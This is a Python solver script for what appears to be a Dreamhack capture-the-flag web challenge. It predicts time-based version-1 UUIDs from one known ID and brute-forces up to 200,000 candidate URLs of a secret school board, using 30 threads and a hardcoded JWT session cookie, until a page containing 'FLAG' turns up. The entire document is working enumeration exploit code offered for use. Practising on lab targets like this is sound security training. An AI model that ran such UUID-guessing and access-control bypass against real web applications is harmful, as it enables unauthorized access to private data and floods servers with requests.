import uuid
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://host3.dreamhack.games:12422"
SCHOOL = "드림대학교"
TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3ODU4OTEzNDUsImV4cCI6MTc4NTg5NDk0NSwidXNlcm5hbWUiOiJhYWFhIiwic2Nob29sIjoi65Oc66a864yA7ZWZ6rWQIn0.TXM8AuMuIjFZ6peKtokxO52h9jWLcc3e8m0ubLdIAoA"

FREE_ID = uuid.UUID("a066dd6c-9067-11f1-8e78-aafc00026401")


def uuid1_from_time(t):
    clock_seq = FREE_ID.clock_seq
    node = FREE_ID.node

    return uuid.UUID(
        fields=(
            t & 0xffffffff,
            (t >> 32) & 0xffff,
            ((t >> 48) & 0x0fff) | 0x1000,
            ((clock_seq >> 8) & 0x3f) | 0x80,
            clock_seq & 0xff,
            node,
        )
    )


def check(offset):
    candidate = str(uuid1_from_time(FREE_ID.time + offset))
    url = f"{BASE}/s/{SCHOOL}/{candidate}"

    r = requests.get(
        url,
        cookies={"token": TOKEN},
        timeout=5,
    )

    if r.status_code == 200 and "FLAG" in r.text:
        return candidate, r.text

    return None


with ThreadPoolExecutor(max_workers=30) as executor:
    jobs = [executor.submit(check, i) for i in range(1, 200000)]

    for job in as_completed(jobs):
        result = job.result()

        if result:
            board_id, page = result
            print("[+] 비밀게시판 UUID:", board_id)
            print(page)
            break